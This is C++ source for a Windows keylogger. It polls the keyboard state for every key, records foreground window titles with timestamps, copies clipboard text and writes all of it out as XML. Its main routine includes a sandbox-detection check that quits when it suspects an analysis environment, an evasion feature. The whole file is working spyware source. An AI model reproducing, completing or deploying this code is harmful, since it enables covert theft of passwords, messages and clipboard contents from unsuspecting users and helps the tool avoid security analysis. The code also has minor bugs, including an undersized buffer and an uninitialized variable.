#include "KeyLogger.h"
#include "Sanitize_KeyLogBuff.h"
#include <stdio.h>
char* last_cb_data;
XML_PROCESS_BUFFER current_process_data;
using namespace std;
char _GRAB_WINDOW_TITLE[MaxDirPathLength],_GRAB_WINDOW_TITLE_SECONDARY[MaxDirPathLength];
const time_t hms = time(0);
clock_t Timer = clock(), Timer2;
bool gotchar=true;

FORCEINLINE char* _USER_SHIFT_FOCUS(HWND _PROG_HNDL)
{
    char* temp = (char*)malloc(0x0A);
    /*
        get the total length of the window text length.
    */
    int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
    /*
        grab the foreground title and other important information about the
        process. set the global title accordingly.
    */
    GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE,_FG_WINDOW_TITLELENGTH);
    /*
        generate a time stamp to indicate when the change occurred
    */
    char *TimeStamp=asctime(localtime(&hms));
    /*
        set a null character to the last byte of the time stamp.
    */
    TimeStamp[strlen(TimeStamp)-1]=0x00;
    /*
        print out the xml meta data relevant to the process.
    */

/*    cout<<"\n\t<Process>\n\t\t<ProcessHandle>"<<_PROG_HNDL<<"</ProcessHandle>\n\t\t<ProcessID>"<<GetWindowThreadProcessId(_PROG_HNDL,NULL)
    <<"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<TimeStamp<<"</TimeStamp>\n\t\t\t<logged>"
    <<"\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
*/    current_process_data = writeUnsanitizedBuffer(current_process_data,"\n\t<Process>\n\t\t<ProcessHandle>");
    sprintf(temp,"0x%lu",_PROG_HNDL);
    current_process_data = writeUnsanitizedBuffer(current_process_data,temp);
    current_process_data = writeUnsanitizedBuffer(current_process_data,"</ProcessHandle>\n\t\t<ProcessID>");
    sprintf(temp,"0x%d",GetWindowThreadProcessId(_PROG_HNDL,NULL));
    current_process_data = writeUnsanitizedBuffer(current_process_data,temp);
    current_process_data = writeUnsanitizedBuffer(current_process_data,"</ProcessID>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA[");
    current_process_data = writeSanitizedBuffer(current_process_data,_GRAB_WINDOW_TITLE);
    current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></ProcessTitle>\n\t\t\t<TimeStamp>");
    current_process_data = writeSanitizedBuffer(current_process_data,TimeStamp);
    current_process_data = writeUnsanitizedBuffer(current_process_data,
                                                  "</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[");

    return 0 ;
}

FORCEINLINE void EnterEvent(HWND _PROG_HNDL)
{   /*
        grab the length of the current foreground window title
    */
    int _FG_WINDOW_TITLELENGTH = GetWindowTextLengthA(_PROG_HNDL)+1;
    /*
        grab the text of the current foreground window and load it into
        a secondary storage buffer for further processing.
    */
    GetWindowTextA(_PROG_HNDL,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH);
    /*
        limit the volume of xml statements by doing a comparison between the
        current foreground window and the previously logged buffer.
    */
    if (strncmp(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH))
    {
        /*
            a new title has been logged for the current foreground window.
            copy the new title to the _GRAB_WINDOW_TITLE.
        */
        strncpy(_GRAB_WINDOW_TITLE,_GRAB_WINDOW_TITLE_SECONDARY,_FG_WINDOW_TITLELENGTH);
        /*
            Generate a time stamp for this event.
        */
        char *TimeStamp=asctime(localtime(&hms));
        /*
            set a null character to the end point of this buffer.
        */
        TimeStamp[strlen(TimeStamp)-1]=0x00;
        /*
            generate the proper xml output for a change of title on a process.
        */
  /*      cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA["<<_GRAB_WINDOW_TITLE_SECONDARY<<"]]></ProcessTitle>\n\t\t\t<TimeStamp>"<<
        TimeStamp<<"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[";
  */      current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t\t<title>\n\t\t\t<ProcessTitle><![CDATA[");
        current_process_data = writeSanitizedBuffer(current_process_data,_GRAB_WINDOW_TITLE_SECONDARY);
        current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></ProcessTitle>\n\t\t\t<TimeStamp>");
        current_process_data = writeSanitizedBuffer(current_process_data,TimeStamp);
        current_process_data = writeUnsanitizedBuffer(current_process_data,"</TimeStamp>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[");


    }
}

FORCEINLINE int GrabKey(int VkPrimary,char Primary, char Secondary, int LastKeyStrokeLogged)
{
    /*
        validate the state of the buffer. noise on the buffer can generate errors
        check if the key state is viable at this point.
        check to see if a  keystroke has already been logged. not doing so will
        result in erroneous behavior on the next pass
    */
   if (GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_0 and GetAsyncKeyState(VkPrimary)!=AsyncKeyStateTest_1 and gotchar )
       {
           /*
                a key stroke was successfully logged set the global flag
                to false.
            */
           gotchar=false;
           /*
                ensure that the keystroke that was logged here is not due to
                a contaminated keyboard buffer.
            */
           if (LastKeyStrokeLogged!=VkPrimary)
               {
                   /*
                        The buffer is clear of previous events but the user may
                        be holding a key down, to deal with this problem we must
                        set a timer to evaluate the keyboard behavior
                   */
                   Timer=clock();
                   /*
                        synchronize two timers to be used in the event that the user
                        is holding down a key.
                   */
                   Timer2=Timer;
                   /*
                        determine if the shift has been toggled, if it has then
                        use the secondary mapping.
                   */
                   char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
                    /*
                        determine if the key stroke logged is a special
                        xml character. if so log sanitized character codes
                    */
                    current_process_data = writeSanitizedByte(current_process_data,temp);
/*                   switch(temp)
                   {
                     case '<':  cout << "&lt;"; break;
                     case '>':  cout << "&gt;"; break;
                     case '&':  cout << "&amp;"; break;
                     case '\'':  cout << "&apos;"; break;
                     case '"':  cout << "&quot;"; break;
                     default:  cout << temp; break;
                   }
*/                   /*
                        set the state for the last key stroke logged, this will
                        allow the program to determine that the keyboard buffer
                        has not yet been flushed.
                   */
                   LastKeyStrokeLogged=VkPrimary;
               }
            /*
                see if the timer has elapsed to the right point.
                NOTE: for testing it is hard coded but this will be changed
                      to read necessary timing information off of the registry
                timer one determines the primary time span before it is determined
                that a user is holding a key down.
                timer two is used to determine the interval by which keys are logged
                to the buffer from that point until the buffer is flushed
            */
           if((Timer-clock())/500 && ((Timer2-clock())/31))
               {
                   /*
                        reset timer two to the current clock.
                        IMPORTANT for if statement to function
                    */
                   Timer2=clock();
                   /*
                        determine if the shift key is toggled, to get the correct Primary
                        key mapping.
                   */
                   char temp = GetAsyncKeyState(VK_SHIFT)?Secondary:Primary;
                   /*
                        determine if the keystroke logged is a special xml character,
                        if so shoot out sanitized xml character codes
                   */
                current_process_data = writeSanitizedByte(current_process_data,temp);

 /*                  switch(temp)
                   {
                     case '<':  cout << "&lt;"; break;
                     case '>':  cout << "&gt;"; break;
                     case '&':  cout << "&amp;"; break;
                     case '\'':  cout << "&apos;"; break;
                     case '"':  cout << "&quot;"; break;
                     default:  cout << temp; break;
                   }
  */                 /*
                        set the state of the last key stroke logged so
                        this will allow the program to determine that the
                        keyboard buffer has not yet been flushed.
                   */
                   LastKeyStrokeLogged=VkPrimary;
               }
           }
   return LastKeyStrokeLogged;
}

FORCEINLINE int GrabFuncKey(char FunctionKey, char* StrOut,int LastKeyStrokeLogged )
{
    /*
        validate the state of the buffer. noise on the buffer can generate errors
        check if the key state is viable at this point.
        check to see if a  keystroke has already been logged. not doing so will
        result in erroneous behavior on the next pass
    */
    if (GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_0 and GetAsyncKeyState(FunctionKey)!=AsyncKeyStateTest_1 and gotchar )
        {
            /*
                set the global flag to indicate that a character has been
                retrieved from the buffer.
            */
            gotchar=false;
            /*
                check to ensure that the function key was not grabbed from
                a contaminated key state buffer
            */
            if (LastKeyStrokeLogged!=FunctionKey)
                {
                   /*
                        The buffer is clear of previous events but the user may
                        be holding a key down, to deal with this problem we must
                        set a timer to evaluate the keyboard behavior
                   */
                   Timer=clock();
                   /*
                        synchronize two timers to be used in the event that the user
                        is holding down a key.
                   */
                   Timer2=Timer;
                   /*
                        put the string representing a function key to the string
                   */
                    current_process_data = writeSanitizedBuffer(current_process_data,StrOut);
    //                cout<<StrOut;
                    /*
                        set the state of the last key stroke logged so
                        this will allow the program to determine that the
                        keyboard buffer has not yet been flushed.
                   */
                    LastKeyStrokeLogged=FunctionKey;
                }
            /*
                see if the timer has elapsed to the right point.
                NOTE: for testing it is hard coded but this will be changed
                      to read necessary timing information off of the registry
                timer one determines the primary time span before it is determined
                that a user is holding a key down.
                timer two is used to determine the interval by which keys are logged
                to the buffer from that point until the buffer is flushed
            */
            if((Timer-clock())/500 && ((Timer2-clock())/31))
                {
                    /*
                        reset timer two to the current clock.
                        IMPORTANT for if statement to function
                    */
                    Timer2=clock();
                   /*
                        put the string representing a function key to the string
                   */
                   current_process_data = writeSanitizedBuffer(current_process_data,StrOut);
 //                   cout<<StrOut;
                    /*
                        set the state of the last key stroke logged so
                        this will allow the program to determine that the
                        keyboard buffer has not yet been flushed.
                   */
                    LastKeyStrokeLogged=FunctionKey;
                }
        }

    return LastKeyStrokeLogged;
}

FORCEINLINE int grabclipboard()
{
    /*
        attempt to open the clipboard,
        if that fails it is likely that the clipboard is locked
        by another program or by the operating system, check the
        clipboard again next iteration.
    */
    if (OpenClipboard(NULL))
        {
            /*
                declare a buffer to hold clipboard data temporarily
                while it is being verified.
            */
            char* this_cb_data;
            /*
                grab a handle to the clip board, and specify the CF_TEXT,
                as to not grab data that will crash the program.
            */
            HANDLE cb_lock_handle = GetClipboardData(CF_TEXT);
            /*
                if the handle is invalid then close the clipboard
            */
            if(cb_lock_handle)
                {
                    /*
                        lock the clipboard, this is important, if the
                        clipboard is not locked then the data may become corrupted.
                    */
                    this_cb_data=(char*)GlobalLock(cb_lock_handle);
                    /*
                        if their is nothing in the clipboard, then unlock and close
                        the clipboard. exit this function with status 0,
                    */
                    if(!strlen(this_cb_data))
                    {
                        GlobalUnlock(cb_lock_handle);
                        CloseClipboard();
                        return 0;
                    }
                    /*
                        first check that last_cb_data  has been set, if not then continue processing the cb data,
                        then do a string comparison between the last cb_data and this cb_data, if their different,
                        then continue processing the cb_data.
                    */
                    if ( last_cb_data == NULL || (strncmp(last_cb_data,this_cb_data,strlen(this_cb_data)-1)))
                    {
                        /*
                            if last_cb_data has not yet been set allocate memory for the data, else
                                resize the allocated memory for the cb_data coming in.
                        */
                        if(last_cb_data == NULL)
                            last_cb_data = (char*)malloc(strlen(this_cb_data)+1);
                        else
                            last_cb_data = (char*)realloc(last_cb_data,strlen(this_cb_data)+1);
                        /*
                            copy the recently logged clip board data over to the last_cb_data buffer.
                        */
                        strncpy(last_cb_data,this_cb_data,strlen(this_cb_data));

                        /*
                            print all the necessary meta data for the clipboard
                                NOTE:L, a sanitizer function for the xml still has to be written.
                        */
/*                        cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>"<<
                        "\n\t\t\t\t<Capture>"<<(char*)this_cb_data<<"</Capture>\n\t\t\t</logged>\n\t\t\t<logged>"<<
                        "\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" ;
*/
                         current_process_data = writeUnsanitizedBuffer(current_process_data,
                                "]]></Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>ClipBoard</CaptureType>\n\t\t\t\t<Capture>");
                         current_process_data = writeSanitizedBuffer(current_process_data,(char*)this_cb_data);
                         current_process_data = writeUnsanitizedBuffer(current_process_data,
                                "</Capture>\n\t\t\t</logged>\n\t\t\t<logged>\n\t\t\t\t<CaptureType>Keylogger</CaptureType>\n\t\t\t\t<Capture><![CDATA[" );

                    }
                    /*
                        unlock the clipboard. so that other programs waiting in que to access the
                        clipboard can access it.
                    */
                    GlobalUnlock(cb_lock_handle);
                }
            CloseClipboard();
        }
    return 0;
}

int main()
{
    /*
        allocate memory for the buffered data to store he xml tags of each process
    */
    current_process_data.buffered_data = (char*)malloc(DefaultBufferSz);
    /*
        set the current buffer size so that the total amount of space available is known
    */
    current_process_data.buffer_size=DefaultBufferSz;
    /*
        no data has been written to the buffer
    */
    current_process_data.current_buff_offset=0;
    /*
        execute a check to see if we may be in a sandboxed environment,
        the check relies on the number of processors running on the device
        if this check fails then exit from the environment
    */
    if(SandBoxDetection()) return SandBoxedInstance;
    /*
        display an xml header to generate the end document.
    */
   // cout << "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n";
    current_process_data = writeUnsanitizedBuffer(current_process_data,
    "<?xml version=\"1.0\" encoding=\"utf-8\"?>\n<?xml-stylesheet type=\"text/xsl\" href=\"keyloggerStyle.xsl\"?>\n<KeyLoggerMetaData>\n");
    /*
        grab a handle to the foreground process.
    */
    HWND CURRENTPROCEESS=GetForegroundWindow();
    /*
        initialize the foreground window.
    */
    _USER_SHIFT_FOCUS(CURRENTPROCEESS);
    /*
        declare a buffer to store keyboard states.
    */
    unsigned int LastKeyStrokeLogged;
    /*
        the main loop, capture key strokes indefinitely.
    */
    while (1)
    {

        /*
            global flag that dictates the state of the keyboard buffer
            if the keyboard buffer is not empty from a previous key
            stroke then the program will fault
        */
        gotchar=true;
        /*
            determine if the user has shifted focus to a new process
        */
        if (CURRENTPROCEESS==GetForegroundWindow())
        {
            /*
                check to see if the value of the keyboard buffer is in one of two states
                0, or 1, if so then the global key state buffer is not sanitary and should not
                be trusted
            */
            if (GetAsyncKeyState(LastKeyStrokeLogged)== AsyncKeyStateTest_0 or GetAsyncKeyState(LastKeyStrokeLogged)==AsyncKeyStateTest_1)
                LastKeyStrokeLogged=1;
                /*default failed buffers to a state of (1)*/

            /*
                increment an anonymous value starting at the "0" position of the ASCII table and increment to
                "9".
            */
            for (int x=StartAsciiDec; x<EndAsciiDec; x++)
                /*
                    log the key and check for encoding from shift key state.
                    map secondary outputs as well for state.
                */
                LastKeyStrokeLogged=GrabKey(x,(char)x,_Char_Table[x-AsciiDecimalToBase],LastKeyStrokeLogged);
            /*
                increment an anonymous value starting at the "a" position of the ASCII table and increment to
                "Z".
            */
            for (int x=StartAsciiAlphebet; x<EndAsciiAlphebet;x++)
                /*
                    log the key and check for key case, finally send a secondary mapping so that shift
                     can be toggled.
                */
                LastKeyStrokeLogged=GetKeyState(VK_CAPITAL)?GrabKey(x,x,(x+AsciiLowerToUpper),LastKeyStrokeLogged):GrabKey(x,x+AsciiLowerToUpper,x,LastKeyStrokeLogged);
            /*
                iterate over the function keys
            */
            for (int x=StartFunctionKeys; x<EndFunctionKeys; x++)
                /*
                    log the intention justified by the function keys in a a character sequence that is likely not used
                    by the end user.
                */
                LastKeyStrokeLogged=GrabFuncKey(MapFunctionVkeys[x].Key,MapFunctionVkeys[x].str,LastKeyStrokeLogged);
            /*
                iterate over the set of keys available on the keyboard, but with no linear mapping.
            */
            for (int x=StartUnmapedKeys; x<EndUnmapedKeys; x++)
                /*
                    grab thous key states that are not linearly justified, also deliver to
                    the function secondary key states that can be toggled via the shift key.
                */
                LastKeyStrokeLogged=GrabKey(VkKeyScanExA(MapUnmapedVkeys[x].Primary,GetKeyboardLayout(0)),MapUnmapedVkeys[x].Primary,MapUnmapedVkeys[x].Secondary,LastKeyStrokeLogged);
        }
        else
        /*
            if the users focus has shifted from the currently logged foreground window
            then take steps to indicate the state change.
        */
        {
            /*
                complete the xml statements that were previously initialized then
                initialize a new process xml tag.
            */
 //           cout<<"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>";
            current_process_data = writeUnsanitizedBuffer(current_process_data,"]]></Capture>\n\t\t\t</logged>\n\t\t</title>\n\t</Process>");
            current_process_data = writeUnsanitizedByte(current_process_data,(char)0x00);
                cout<<current_process_data.buffered_data;
            current_process_data.buffered_data = (char*)realloc(current_process_data.buffered_data,DefaultBufferSz);
            current_process_data.buffer_size=DefaultBufferSz;
            current_process_data.current_buff_offset=0;
            /*
                get the current foreground window and store it in the CURRENTPROCESS.
            */
            CURRENTPROCEESS=GetForegroundWindow();
            /*
                call to initialize tags and further process the foreground window.
            */
            _USER_SHIFT_FOCUS(CURRENTPROCEESS);
        }
        /*
            checks for changes in the clipboard state.
        */
        grabclipboard();
        /*
            it is common for titles to change in processes,especially in browsers.
            this checks if the current foreground window has registered under a new
            title.
        */
        EnterEvent(CURRENTPROCEESS);
    }
    return 0;
}
